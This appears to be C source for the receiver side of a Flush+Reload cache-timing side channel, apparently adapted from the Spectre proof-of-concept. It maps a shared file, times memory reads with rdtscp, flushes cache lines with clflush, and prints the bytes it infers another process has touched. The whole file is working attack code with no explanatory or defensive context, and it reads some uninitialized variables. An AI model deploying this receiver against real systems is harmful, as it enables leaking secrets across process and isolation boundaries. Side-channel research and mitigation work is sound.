#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>
#ifdef _MSC_VER
#include <intrin.h>        /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h>     /* for rdtscp and clflush */
#endif

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (110)  /* assume cache hit if time <= threshold */

uint8_t *array2;
unsigned int array1_size = 16;
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };

int main() {
	int fd = open("./shared_file", O_RDONLY);
	array2 = (uint8_t*)mmap(NULL, 256 * 512, PROT_READ, MAP_SHARED, fd, 0);

	if (array2 == MAP_FAILED) {
		printf("map failed %d >< %d\n", errno, EACCES);
		return 0;
	}

	static int results[256];
	int tries, i, reading, j, last_value, k, mix_i;
	unsigned junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;
	/* Time reads. Order is lightly mixed up to prevent stride prediction */

	int printed = 0;
	for (reading = 1; ; ++reading) {
		for (i = 0; i < 256; i++) {
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			time1 = __rdtscp(&junk);            /* READ TIMER */
			junk = *addr;                       /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++;  /* cache hit - add +1 to score for this j */
		}
			/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]);  /* intrinsic for clflush instruction */

		/* Locate highest & second-highest results results tallies in j/k */
		if (reading % 1 == 0) {
			j = k = -1;
			for (i = 0; i < 256; i++) {
				if (j < 0 || results[i] >= results[j]) {
					k = j;
					j = i;
				} else if (k < 0 || results[i] >= results[k]) {
					k = i;
				}
			}

			results[0] ^= junk;  /* use junk so code above won't get optimized out*/
			if (j != last_value && j > 31 && j < 127) {
			/* if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)) { */
				/* printf("%c", (j > 31 && j < 127 ? j : '.')); */
				printf("%c", j);
				printed += 1;
				fflush(stdout);
				if (printed % 0x50 == 0) {
					printf("\n");
				}
				last_value = j;
			}

			reading = 1;
			for (int i = 0; i < 256; ++i) {
				/* printf("%d ", results[i]); */
				results[i] = 0;
			}
			/* printf("\n"); */
		}
	}
}
